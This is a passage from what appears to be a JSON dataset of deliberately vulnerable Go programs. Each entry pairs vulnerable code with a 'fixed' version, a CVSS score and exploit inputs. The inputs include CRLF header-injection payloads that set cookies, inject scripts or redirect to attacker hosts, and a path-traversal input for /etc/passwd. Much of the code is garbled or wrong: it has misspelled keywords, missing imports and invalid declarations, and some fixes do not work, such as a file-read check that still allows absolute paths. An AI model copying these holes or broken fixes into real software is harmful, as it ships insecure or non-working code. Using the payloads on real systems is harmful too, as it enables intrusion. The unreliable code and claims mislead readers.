        "fixed_code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n\t\"net/url\"\n)\n\ntype ResponseSplitter struct {\n}\n\nfunc (r *ResponseSplitter) ServeHTTP(w http.ResponseWriter, req *http.Request) {\n\tparam := url.QueryEscape(req.URL.Query().Get(\"param\"))\n\tw.Header().Set(\"Custom-Header\", param)\n\tfmt.Fprintf(w, \"Parameter: %s\", param)\n}\n\nfunc main() {\n\thttp.Handle(\"/\", &ResponseSplitter{})\n\thttp.ListenAndServe(\":8080\", nil)\n}",
        "exploit_ways": [
            "An attacker can inject 'param=\\r\\nSet-Cookie: MaliciousCookie=Hacked' to manipulate headers.",
            "They could use 'param=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2035%0d%0a%0d%0a<html><h1>Hacked</h1></html>' to inject a fake response.",
            "Injecting 'param=\\r\\nLocation: http://malicious-site.com' could redirect victims to another site."
        ]
    },
    "go_40": {
        "vulnerability_type": "HTTP Response Splitting",
        "vulnerability_code": "package main\n\nimport (\n    \"fmt\"\n    \"net/http\"\n)\n\nfunc vulnerableHandler(w http.ResponseWriter, r *http.Request) {\n    name := r.URL.Query().Get(\"name\")\n    w.Header().Set(\"X-Custom-Header\", name)\n    fmt.Fprintf(w, \"Hello, %s!\", name)\n}\n\nfunc main() {\n    http.HandleFunc(\"/greet\", vulnerableHandler)\n    http.ListenAndServe(\":8080\", nil)\n}",
        "cvss_score": 4.3,
        "fixed_code": "package main\n\nimport (\n    \"fmt\"\n    \"net/http\"\n    \"net/url\"\n)\n\nfunc safeHandler(w http.ResponseWriter, r *http.Request) {\n    name := url.PathEscape(r.URL.Query().Get(\"name\"))\n    w.Header().Set(\"X-Custom-Header\", name)\n    fmt.Fprintf(w, \"Hello, %s!\", name)\n}\n\nfunc main() {\n    http.HandleFunc(\"/greet\", safeHandler)\n    http.ListenAndServe(\":8080\", nil)\n}",
        "exploit_ways": [
            "An attacker can inject '\\r\\nSet-Cookie: evil=true' to set a malicious cookie.",
            "They could use '\\r\\nContent-Length: 0\\r\\nConnection: close' to prematurely end the response.",
            "Input like '\\r\\nHTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n<html><script>alert(\\x27XSS\\x27)</script></html>' can inject a script."
        ]
    },
    "go_41": {
        "vulnerability_type": "Session Fixation (Low Severity)",
        "vulnerability_code": "package main\n\nimport (\n\t\\\"fmt\\\"\n\t\\\"net/http\\\"\n\t\\\"strings\\\"\n)\n\nfunc sessionHandler(w http.ResponseWriter, r *http.Request) {\n\tsessionID := r.URL.Query().Get(\\\"session_id\\\")\n\tif sessionID != \\\"\\\" {\n\t\tcookie := &http.Cookie{\n\t\t\tName:     \\\\\"session\\\\\",\n\t\t\tValue:    sessionID,\n\t\t\tPath:     \\\\\"/\\\\\",\n\t\t\tHttpOnly: true,\n\t\t}\n\t\thttp.SetCookie(w, cookie)\n\t}\n\tfmt.Fprintf(w, \\\\\"Session handled\\\\\")\n}\n\nfunc main() {\n\thttp.HandleFunc(\\\"/session\\\", sessionHandler)\n\thttp.ListenAndServe(:8080, nil)\n}",
        "cvss_score": 4.2,
        "fixed_code": "package main\n\nimport (\n\t\\\"fmt\\\"\n\t\\\"net/http\\\"\n\t\\\"crypto/rand\\\"\n\t\\\"encoding/base64\\\"\n)\n\nfunc generateSessionID() (string, error) {\n\tb := make([]byte, 32)\n\t_, err := rand.Read(b)\n\tif err != nil {\n\t\treturn \\\"\\\", err\n\t}\n\treturn base64.StdEncoding.EncodeToString(b), nil\n}\n\nfunc sessionHandler(w http.ResponseWriter, r *http.Request) {\n\tsessionID, _ := generateSessionID()\n\tcookie := &http.Cookie{\n\t\tName:     \\\\\"session\\\\\",\n\t\tValue:    sessionID,\n\t\tPath:     \\\\\"/\\\\\",\n\t\tHttpOnly: true,\n\t}\n\thttp.SetCookie(w, cookie)\n\tfmt.Fprintf(w, \\\\\"Session handled\\\\\")\n}\n\nfunc main() {\n\thttp.HandleFunc(\\\"/session\\\", sessionHandler)\n\thttp.ListenAndServe(:8080, nil)\n}",
        "exploit_ways": [
            "An attacker can predict or guess the session ID to hijack a user's session.",
            "By using a crafted URL with a specific session_id parameter, an attacker could force a user into a malicious session.",
            "The vulnerability allows for potential privilege escalation if the attacker can control the session content."
        ]
    },
    "go_42": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "package main\n\nimport (\n\t\"fmt\"\n\t\"time\"\n)\n\nvar counter int = 0\n\ntype SafeCounter struct {\n\tv   map[string]int\n\tmux sync.Mutex\n}\n\nfunc (c *SafeCounter) Inc(key string) {\n\tc.mux.Lock()\n\tdofer c.mux.Unlock()\n\tc.v[key]++\n}\n\nfunc (c *SafeCounter) Value(key string) int {\n\tc.mux.Lock()\n\tdofer c.mux.Unlock()\n\treturn c.v[key]\n}\n\nfunc worker(c *SafeCounter, id int) {\n\tfor i := 0; i < 1000; i++ {\n\t\t// Race condition is intentionally left in the following line\n\t\tcounter++\n\t\ttime.Sleep(1 * time.Nanosecond)\n\t}\n\tfmt.Printf(\"Worker %d done\\n\", id)\n}\n\nfunc main() {\n\tc := SafeCounter{v: make(map[string]int)}\n\tfor i := 0; i < 10; i++ {\n\t\tgo worker(&c, i)\n\t}\n\ttime.Sleep(2 * time.Second)\n\tfmt.Println(\"Final counter value:\", counter)\n}",
        "cvss_score": 4.3,
        "fixed_code": "package main\n\nimport (\n\t\"fmt\"\n\t\"sync\"\n\t\"time\"\n)\n\nvar counter int = 0\nvar mutex sync.Mutex\n\ntype SafeCounter struct {\n\tv   map[string]int\n\tmux sync.Mutex\n}\n\nfunc (c *SafeCounter) Inc(key string) {\n\tc.mux.Lock()\n\tdefer c.mux.Unlock()\n\tc.v[key]++\n}\n\nfunc (c *SafeCounter) Value(key string) int {\n\tc.mux.Lock()\n\tdefer c.mux.Unlock()\n\treturn c.v[key]\n}\n\nfunc worker(c *SafeCounter, id int) {\n\tfor i := 0; i < 1000; i++ {\n\t\tmutex.Lock()\n\t\tcounter++\n\t\tmutex.Unlock()\n\t\ttime.Sleep(1 * time.Nanosecond)\n\t}\n\tfmt.Printf(\"Worker %d done\\n\", id)\n}\n\nfunc main() {\n\tc := SafeCounter{v: make(map[string]int)}\n\tfor i := 0; i < 10; i++ {\n\t\tgo worker(&c, i)\n\t}\n\ttime.Sleep(2 * time.Second)\n\tfmt.Println(\"Final counter value:\", counter)\n}",
        "exploit_ways": [
            "An attacker could cause the program to enter a deadlock by creating many goroutines that continuously try to increment the shared variable.",
            "By carefully timing inputs, an attacker might exploit this race condition to force the counter into unexpected states, potentially affecting other logic dependent on it.",
            "If part of a larger system, inconsistent state updates due to race conditions could lead to data corruption or service instability."
        ]
    },
    "go_43": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "package main\n\nimport (\n    \"net/http\"\n)\n\nfunc vulnerableHandler(w http.ResponseWriter, r *http.Request) {\n    w.Write([]byte(\"Hello, World!\"))\n}",
        "cvss_score": 2.8,
        "fixed_code": "package main\n\nimport (\n    \"net/http\"\n)\n\nfunc secureHandler(w http.ResponseWriter, r *http.Request) {\n    w.Header().Set(\"Content-Security-Policy\", \"default-src 'self'\")\n    w.Header().Set(\"X-Frame-Options\", \"SAMEORIGIN\")\n    w.Header().Set(\"X-XSS-Protection\", \"1; mode=block\")\n    w.Header().Set(\"X-Content-Type-Options\", \"nosniff\")\n    w.Write([]byte(\"Hello, World!\"))\n}",
        "exploit_ways": [
            "An attacker could inject malicious scripts if the application is vulnerable to XSS.",
            "Clickjacking attacks might be possible due to lack of X-Frame-Options header.",
            "Sensitive information may be leaked through MIME type sniffing as X-Content-Type-Options header is missing."
        ]
    },
    "go_44": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "package main\n\nimport (\n\t\"fmt\"\n\t\"time\"\n)\nglobalVar int = 0\n\nfunc increment() {\n\tlocalVar := globalVar\n\ttime.Sleep(1 * time.Nanosecond)\t// Simulate some processing delay\n\tglobalVar = localVar + 1\n}\n\nfunc main() {\n\tfor i := 0; i < 1000; i++ {\n\t\tgo increment()\n\t}\n\ttime.Sleep(2 * time.Millisecond) // Wait for all goroutines to finish\n\tfmt.Println(globalVar)\t// Expected 1000, but might print less due to race condition\n}",
        "cvss_score": 4.6,
        "fixed_code": "package main\n\nimport (\n\t\"fmt\"\n\t\"sync\"\n\t\"time\"\n)\nglobalVar int = 0\nvar mu sync.Mutex\n\nfunc increment() {\n\tmu.Lock()\n\tlocalVar := globalVar\n\ttime.Sleep(1 * time.Nanosecond)\t// Simulate some processing delay\n\tglobalVar = localVar + 1\n\tmu.Unlock()\n}\n\nfunc main() {\n\tfor i := 0; i < 1000; i++ {\n\t\tgo increment()\n\t}\n\ttime.Sleep(2 * time.Millisecond) // Wait for all goroutines to finish\n\tfmt.Println(globalVar)\t// Expected and will print 1000\n}",
        "exploit_ways": [
            "An attacker could force the race condition to occur by manipulating system load, causing incorrect increments.",
            "By timing attacks, an adversary might predict when the global variable is being updated, leading to inconsistent state.",
            "Race conditions can lead to data corruption in more complex systems, making it difficult to debug and secure without proper synchronization."
        ]
    },
    "go_45": {
        "vulnerability_type": "HTTP Response Splitting",
        "vulnerability_code": "package main\n\nimport (\n    \"fmt\"\n    \"net/http\"\n)\n\nfunc handler(w http.ResponseWriter, r *http.Request) {\n    name := r.URL.Query().Get(\"name\")\n    w.Header().Set(\"Location\", \"/greet?name=\"+name)\n    w.WriteHeader(http.StatusFound)\n}\n\nfunc main() {\n    http.HandleFunc(\"/redirect\", handler)\n    fmt.Println(\"Server starting...\")\n    http.ListenAndServe(\":8080\", nil)\n}",
        "cvss_score": 7.5,
        "fixed_code": "package main\n\nimport (\n    \"fmt\"\n    \"net/http\"\n    \"net/url\"\n)\n\nfunc handler(w http.ResponseWriter, r *http.Request) {\n    name := r.URL.Query().Get(\"name\")\n    encodedName := url.PathEscape(name)\n    w.Header().Set(\"Location\", \"/greet?name=\"+encodedName)\n    w.WriteHeader(http.StatusFound)\n}\n\nfunc main() {\n    http.HandleFunc(\"/redirect\", handler)\n    fmt.Println(\"Server starting...\")\n    http.ListenAndServe(\":8080\", nil)\n}",
        "exploit_ways": [
            "An attacker can inject '\\r\\nSet-Cookie: evil=true' to manipulate cookies.",
            "They can use '\\r\\nHTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n<h1>Exploit</h1>' to deliver a fake response.",
            "Input like '\\r\\nLocation: http://attacker.com' can redirect users to a malicious site."
        ]
    },
    "go_46": {
        "vulnerability_type": "Local File Inclusion (LFI) - Limited Scope",
        "vulnerability_code": "package main\n\nimport (\n    \"fmt\"\n    \"os\"\n)\n\nfunc main() {\n    var filename string\n    fmt.Print(\"Enter file name to read:\")\n    fmt.Scan(&filename)\n    data, _ := os.ReadFile(filename)\n    fmt.Println(string(data))\n}",
        "cvss_score": 4.2,
        "fixed_code": "package main\n\nimport (\n    \"fmt\"\n    \"os\"\n    \"path/filepath\"\n    \"strings\"\n)\n\nfunc main() {\n    var filename string\n    fmt.Print(\"Enter file name to read:\")\n    fmt.Scan(&filename)\n    \ncleanFilename := filepath.Clean(filename)\nif !strings.HasPrefix(cleanFilename, \".\") {\n        data, err := os.ReadFile(cleanFilename)\n        if err != nil {\n            fmt.Println(\"Error reading file\", err)\n            return\n        }\n        fmt.Println(string(data))\n    } else {\n        fmt.Println(\"Access denied\")\n    }\n}",
        "exploit_ways": [
            "An attacker can input \"../etc/passwd\" to read sensitive system files.",
            "They might try \"..\\config.txt\" on Windows systems to access configuration files.",
            "Using \"./secret_data\" could lead to unauthorized disclosure of internal application data."
        ]
    },
    "go_47": {
        "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
        "vulnerability_code": "package main\n\nimport (\n\t\"fmt\"\n\t\"time\"\n)\n\nfunc vulnerableFunction() {\n\tfor {\n\t\tfmt.Println(\"Running...\")\n\t\ttime.Sleep(1 * time.Second)\n\t}\n}",
        "cvss_score": 4.2,
        "fixed_code": "package main\n\nimport (\n\t\"fmt\"\n\t\"os\"\n\t\"time\"\n)\n\nfunc safeFunction() {\n\tsigChan := make(chan os.Signal, 1)\n\tsignal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)\n\tfor {\n\t\tselect {\n\t\tcase <-sigChan:\n\t\t\tfmt.Println(\"Shutting down...\")\n\t\t\treturn\n\t\tdefault:\n\t\t\tfmt.Println(\"Running...\")\n\t\t\ttime.Sleep(1 * time.Second)\n\t\t}\n\t}\n}",
        "exploit_ways": [
            "An attacker can start the function, causing a continuous loop that consumes resources indefinitely.",
            "The loop can be triggered multiple times to exacerbate resource usage and slow down the system.",
            "By filling up the server with requests triggering this function, an attacker can cause performance degradation."
        ]
    },
    "go_48": {
        "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
        "vulnerability_code": "package main\n\nimport (\n    \"fmt\"\n    \"time\"\n)\n\nfunc main() {\n    for {\n        fmt.Println(\"Running...\")\n        time.Sleep(1 * time.Second)\n    }\n}",
        "cvss_score": 4.0,
        "fixed_code": "package main\n\nimport (\n    \"fmt\"\n    \"time\"\n)\n\nfunc main() {\n    for i := 0; i < 60; i++ {\n        fmt.Println(\"Running...\")\n        time.Sleep(1 * time.Second)\n    }\n}",
        "exploit_ways": [
            "An attacker can run this program to consume CPU resources indefinitely, leading to a low-impact denial of service.",
            "The program could be scheduled or triggered in large numbers to degrade the performance of the server or system it's running on.",
            "If part of a larger application, this loop could prevent other functionalities from executing properly."
        ]
    }
}